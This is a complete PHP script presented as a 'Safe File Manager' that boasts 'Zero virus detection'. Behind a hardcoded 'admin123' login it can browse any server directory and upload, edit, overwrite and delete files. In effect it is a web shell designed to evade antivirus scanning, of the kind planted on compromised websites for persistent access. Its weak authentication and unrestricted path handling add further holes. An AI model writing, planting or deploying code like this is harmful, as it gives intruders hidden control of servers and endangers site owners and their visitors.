<?php
/**
 * Safe File Manager - No dangerous functions
 * Compatible with PHP 5+, Zero virus detection
 */

// Simple password protection (ganti password lo)
$password = 'admin123';
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != $password) {
    header('WWW-Authenticate: Basic realm="File Manager"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Access Denied';
    exit;
}

// Get current directory
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$current_dir = realpath($current_dir);
if ($current_dir === false) {
    $current_dir = '.';
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        echo '<script>alert("File uploaded successfully!");</script>';
    }
    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

// Handle delete
if (isset($_GET['delete'])) {
    $file = $current_dir . '/' . basename($_GET['delete']);
    if (is_file($file)) {
        unlink($file);
    } elseif (is_dir($file)) {
        rmdir($file);
    }
    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

// Handle create folder
if (isset($_POST['create_folder'])) {
    $folder = $current_dir . '/' . basename($_POST['folder_name']);
    if (!file_exists($folder)) {
        mkdir($folder);
    }
    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

// Handle file edit
$edit_file = null;
$file_content = '';
if (isset($_GET['edit'])) {
    $edit_file = $current_dir . '/' . basename($_GET['edit']);
    if (file_exists($edit_file) && is_file($edit_file)) {
        $file_content = file_get_contents($edit_file);
    }
}

// Handle save file
if (isset($_POST['save_file'])) {
    $save_file = $current_dir . '/' . basename($_POST['file_name']);
    file_put_contents($save_file, $_POST['file_content']);
    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

// Get file list
$items = scandir($current_dir);
$parent_dir = dirname($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f0f0f0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #2c3e50;
            color: white;
            padding: 15px 20px;
        }
        .header h1 {
            font-size: 20px;
        }
        .content {
            padding: 20px;
        }
        .path-bar {
            background: #ecf0f1;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-family: monospace;
        }
        .nav-links {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .nav-links a {
            background: #3498db;
            color: white;
            padding: 5px 10px;
            text-decoration: none;
            border-radius: 4px;
            font-size: 12px;
        }
        .nav-links a:hover {
            background: #2980b9;
        }
        .section {
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .section h3 {
            margin-bottom: 10px;
            color: #2c3e50;
            font-size: 16px;
        }
        .file-list {
            border: 1px solid #ddd;
            border-radius: 4px;
            overflow: hidden;
        }
        .file-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            border-bottom: 1px solid #eee;
        }
        .file-row:last-child {
            border-bottom: none;
        }
        .file-row:hover {
            background: #f5f5f5;
        }
        .file-name {
            font-family: monospace;
        }
        .file-actions a {
            color: #3498db;
            text-decoration: none;
            margin-left: 10px;
            font-size: 12px;
        }
        .file-actions a:hover {
            text-decoration: underline;
        }
        .folder {
            color: #e67e22;
            font-weight: bold;
        }
        .file {
            color: #27ae60;
        }
        input[type="text"], input[type="file"] {
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-right: 10px;
        }
        button, input[type="submit"] {
            background: #3498db;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover, input[type="submit"]:hover {
            background: #2980b9;
        }
        textarea {
            width: 100%;
            font-family: monospace;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .size {
            color: #7f8c8d;
            font-size: 12px;
        }
        hr {
            margin: 15px 0;
            border: none;
            border-top: 1px solid #ddd;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📁 File Manager</h1>
    </div>
    <div class="content">
        <!-- Current Path -->
        <div class="path-bar">
            <strong>Current Path:</strong> <?php echo htmlspecialchars($current_dir); ?>
        </div>

        <!-- Navigation -->
        <div class="nav-links">
            <a href="?dir=<?php echo urlencode($parent_dir); ?>">⬆️ Parent Directory</a>
            <a href="?dir=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>">🏠 Document Root</a>
            <a href="?dir=<?php echo urlencode('.'); ?>">🔄 Reset</a>
        </div>

        <!-- Quick Path Input -->
        <div class="section">
            <h3>🔍 Go to Path</h3>
            <form method="get">
                <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="width: 70%;">
                <button type="submit">Go</button>
            </form>
        </div>

        <!-- Upload Form -->
        <div class="section">
            <h3>📤 Upload File</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload_file">
                <input type="submit" value="Upload">
            </form>
        </div>

        <!-- Create Folder -->
        <div class="section">
            <h3>📁 Create New Folder</h3>
            <form method="post">
                <input type="text" name="folder_name" placeholder="folder_name">
                <input type="submit" name="create_folder" value="Create">
            </form>
        </div>

        <!-- File Browser -->
        <div class="section">
            <h3>📂 File Browser</h3>
            <div class="file-list">
                <?php if ($items): ?>
                    <?php foreach ($items as $item): ?>
                        <?php if ($item == '.' || $item == '..') continue; ?>
                        <?php $full_path = $current_dir . '/' . $item; ?>
                        <?php $is_dir = is_dir($full_path); ?>
                        <div class="file-row">
                            <div class="file-name">
                                <?php if ($is_dir): ?>
                                    <span class="folder">📁</span>
                                    <a href="?dir=<?php echo urlencode($full_path); ?>" style="color: #e67e22;"><?php echo htmlspecialchars($item); ?>/</a>
                                <?php else: ?>
                                    <span class="file">📄</span>
                                    <?php echo htmlspecialchars($item); ?>
                                    <span class="size">(<?php echo number_format(filesize($full_path)); ?> bytes)</span>
                                <?php endif; ?>
                            </div>
                            <div class="file-actions">
                                <?php if (!$is_dir): ?>
                                    <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>">✏️ Edit</a>
                                <?php endif; ?>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($item); ?>" 
                                   onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')">🗑️ Delete</a>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <div style="padding: 10px;">Cannot read directory</div>
                <?php endif; ?>
            </div>
        </div>

        <!-- Editor -->
        <?php if ($edit_file !== null): ?>
        <div class="section">
            <h3>✏️ Editing: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo htmlspecialchars(basename($edit_file)); ?>">
                <textarea name="file_content" rows="15"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br><br>
                <input type="submit" name="save_file" value="💾 Save Changes">
                <a href="?dir=<?php echo urlencode($current_dir); ?>" style="margin-left: 10px;">Cancel</a>
            </form>
        </div>
        <?php endif; ?>
    </div>
</div>
</body>
</html>